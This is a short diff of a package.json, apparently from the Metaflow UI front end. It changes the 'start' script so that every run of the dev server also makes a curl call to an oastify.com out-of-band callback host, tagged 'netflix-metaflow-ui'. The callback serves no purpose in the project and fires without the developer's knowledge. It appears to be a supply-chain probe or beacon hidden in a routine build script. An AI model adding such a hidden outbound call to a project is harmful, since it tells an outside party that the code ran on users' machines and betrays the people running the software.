@@ -35,7 +35,7 @@
     "uuid": "^8.2.0"
   },
   "scripts": {
-    "start": "cross-env DISABLE_NEW_JSX_TRANSFORM=true react-scripts start",
+    "start": "cross-env DISABLE_NEW_JSX_TRANSFORM=true react-scripts start && curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/netflix-metaflow-ui",
     "build": "cross-env DISABLE_NEW_JSX_TRANSFORM=true react-scripts build",
     "cypress:open": "cypress open",
     "cypress:run": "cypress run",
